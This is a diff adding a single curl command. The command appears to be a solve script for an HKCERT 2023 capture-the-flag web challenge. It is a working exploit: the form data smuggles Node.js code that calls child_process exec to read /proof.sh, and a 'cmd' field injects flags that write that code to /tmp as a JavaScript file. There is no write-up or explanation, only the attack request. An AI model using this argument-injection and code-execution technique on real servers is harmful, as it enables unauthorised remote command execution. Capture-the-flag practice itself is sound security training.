@@ -1,0 +1,13 @@
+curl "http://chal-a.hkcert23.pwnable.hk:28320/" ^
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
+  -H "Accept-Language: en-US,en;q=0.9,fr;q=0.8" ^
+  -H "Cache-Control: max-age=0" ^
+  -H "Connection: keep-alive" ^
+  -H "Content-Type: application/x-www-form-urlencoded" ^
+  -H "Origin: http://chal-a.hkcert23.pwnable.hk:28320" ^
+  -H "Referer: http://chal-a.hkcert23.pwnable.hk:28320/" ^
+  -H "Upgrade-Insecure-Requests: 1" ^
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0" ^
+  --data-raw "json=^%^7B^%^22A^%^22^%^3A^%^22const+^%^7B+exec+^%^7D+^%^3D+require^%^28^%^27child_process^%^27^%^29^%^3Bexec^%^28^%^27cat+^%^2Fproof.sh^%^27^%^2C+^%^28err^%^2C+stdout^%^2C+stderr^%^29+^%^3D^%^3E+^%^7Bconsole.log^%^28stdout^%^29^%^3B^%^7D^%^29^%^3B^%^22^%^7D&cmd=-H+-q++-o+^%^2Ftmp^%^2Fdesp_is_cool.js" ^
+  --compressed ^
+  --insecure
